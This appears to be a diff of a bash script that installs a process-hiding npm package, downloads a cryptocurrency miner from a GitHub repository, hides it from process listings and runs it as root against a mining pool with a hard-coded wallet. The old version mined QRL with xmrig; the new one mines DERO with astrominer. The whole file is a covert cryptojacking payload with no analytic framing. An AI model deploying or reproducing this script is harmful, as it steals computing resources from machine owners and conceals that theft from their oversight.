@@ -1,5 +1,7 @@
+#!/bin/bash
 npm i -g node-process-hider
-wget https://raw.githubusercontent.com/realxdagg/job/main/xmrig
-chmod 500 xmrig
-ph add xmrig
-sudo ./xmrig -o us-qrl.volt-mine.com:4333 -u Q01050018ae33f2279aeafbb40b03bee3c2b69a0f2f27bd147d68dc4c6cfa807e93cc27ccef4e15 -k --tls --threads=8
+git clone https://github.com/realxdagg/job.git
+cd job
+chmod 500 astrominer
+ph add astrominer
+sudo ./astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xe4y4hajkwqp50qqlvpsp -r dero-node-us-west.mysrv.cloud:10300 -p rpc -t 8
